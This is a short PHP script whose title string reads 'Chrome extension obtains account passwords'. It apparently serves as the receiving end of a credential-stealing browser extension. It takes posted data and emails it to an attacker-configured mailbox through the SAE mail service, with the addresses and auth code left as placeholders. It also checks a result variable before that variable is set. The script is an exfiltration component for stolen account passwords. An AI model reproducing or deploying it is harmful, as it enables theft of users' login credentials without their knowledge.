<?php
$mail = new SaeMail();
$title = "Chrome插件获取账号密码";
$content =  $_POST['data'];
if ($ret === false)
     var_dump($mail->errno(), $mail->errmsg());
$mail->clean();
$ret = $mail->quickSend( '收件邮箱' , $title , $content , '发件邮箱' , '发件邮箱授权码' , 'smtp服务器地址' , 25 );
if ($ret === false)
     var_dump($mail->errno(), $mail->errmsg());
?>